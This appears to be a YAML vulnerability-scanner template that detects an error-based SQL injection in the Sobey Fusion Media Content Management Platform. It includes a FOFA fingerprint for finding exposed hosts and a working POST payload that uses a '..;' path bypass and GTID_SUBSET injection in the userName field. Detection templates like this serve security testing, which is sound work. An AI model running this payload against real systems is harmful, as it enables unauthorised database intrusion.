id: sobey-imcmp-countbusinessnumlist-sqli
info:
  name: Sobey Fusion Media Content Management Platform SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: Sobey Fusion Media Content Management Platform
    fofa: |
      body="/Sc-TaskMonitoring/" || header="Sobey"
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: POST
    path:
      - "/sobey-mchEditor/js/..;/mch/Jzt/Business/countBusinessNumList"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      endTime=1&siteCode=&startTime=10&token=&userCode=&userName='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Sobey"
          - ".countBusinessNumList"
          - "java.sql.SQLException"
          - "~{{t2}}~"
